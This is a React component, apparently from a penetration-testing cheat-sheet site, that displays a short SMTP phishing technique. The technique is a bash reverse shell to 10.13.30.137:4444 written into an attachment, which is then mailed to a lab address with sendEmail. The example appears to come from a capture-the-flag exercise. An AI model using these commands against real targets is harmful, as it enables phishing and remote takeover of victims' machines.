import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const SMTP_Phishing = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
              <Box pt={5} />
              <Typography variant="h6">
                    Description
                </Typography>
              <Typography>
              We can send the target a malicious email and get a reverse shell back when they open it.
               </Typography>
               <Box pt={5}/>
               <Typography>
               Reverse Shell as a Linux Application
               </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"echo 'bash -c \"bash -i >& /dev/tcp/10.13.30.137/4444 0>&1\"' > application"}
            </SyntaxHighlighter>
            <Box pt={5}/>
               <Typography>
               CLI: sendEmail
               </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"sendEmail -f shelled@test.com -t hakanbey@uranium.thm -a ./application -m \"Hi\" -s 10.10.23.23 -o tls=no"}
            </SyntaxHighlighter>
            <Box pt={2}/>
            </Typography>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default SMTP_Phishing;
  